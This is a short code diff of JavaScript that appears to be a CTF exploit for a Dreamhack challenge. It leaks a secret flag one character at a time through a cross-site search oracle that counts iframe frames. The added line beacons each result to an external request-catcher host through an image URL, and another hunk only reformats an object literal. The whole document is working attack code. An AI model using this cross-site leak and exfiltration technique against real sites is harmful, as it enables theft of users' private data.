@@ -9,6 +9,7 @@
             iframe.onload = () => {
                 try {
                     let result = iframe.contentWindow.frames.length;
+                    img.src = `https://gscnife.request.dreamhack.games/${result}`;
                     return resolve(result != 0);
                 } catch (e) {
                     return resolve(false);
@@ -24,7 +25,7 @@
         while (!secret.includes("}")) {
             let found = false;
             let promises = chars.split("").map(c => 
-                search(secret + c).then(result => ({ char: c, success: result }))
+                search(secret + c).then(result => ({char:c, success:result}))
             );
             let results = await Promise.all(promises);
 
